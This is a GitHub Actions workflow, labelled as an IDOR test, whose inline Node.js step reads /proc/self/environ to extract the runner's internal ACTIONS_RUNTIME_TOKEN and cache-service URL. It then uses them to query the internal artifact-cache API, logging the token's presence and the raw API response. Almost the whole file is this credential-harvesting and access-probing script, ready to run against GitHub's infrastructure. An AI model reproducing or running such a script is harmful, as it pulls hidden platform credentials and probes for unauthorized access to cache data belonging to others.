name: Cache API IDOR Test V5
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger Cache Env Vars
        uses: actions/cache@v3
        with:
          path: |
            ~/.npm
          key: ${{ runner.os }}-dummy-cache-${{ github.run_id }}
          restore-keys: |
            ${{ runner.os }}-dummy-cache-
      
      - name: Query Internal Cache API via Memory Extract
        run: |
          node -e "
            const fs = require('fs');
            const https = require('https');

            // 1. قراءة ذاكرة العملية بالكامل
            const envStr = fs.readFileSync('/proc/self/environ', 'utf8');
            const envVars = envStr.split('\0');
            const env = {};
            for (const pair of envVars) {
              const idx = pair.indexOf('=');
              if (idx > 0) {
                env[pair.substring(0, idx)] = pair.substring(idx + 1);
              }
            }

            const CACHE_URL = env.ACTIONS_CACHE_URL;
            const TOKEN = env.ACTIONS_RUNTIME_TOKEN;

            console.log('Cache URL found:', CACHE_URL ? 'yes' : 'no');
            console.log('Token found:', TOKEN ? 'yes' : 'no');

            if (CACHE_URL && TOKEN) {
              const queryUrl = CACHE_URL + '_apis/artifactcache/caches';
              console.log('Sending IDOR request to:', queryUrl);

              const parsedUrl = new URL(queryUrl);
              
              const options = {
                hostname: parsedUrl.hostname,
                path: parsedUrl.pathname + parsedUrl.search,
                method: 'GET',
                headers: {
                  'Authorization': 'Bearer ' + TOKEN,
                  'Accept': 'application/json'
                }
              };

              const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                  console.log('Status Code:', res.statusCode);
                  console.log('API Response:', data);
                });
              });

              req.on('error', (e) => console.error('Error:', e.message));
              req.end();
            } else {
              console.log('Failed to extract internal tokens from memory.');
            }
          "
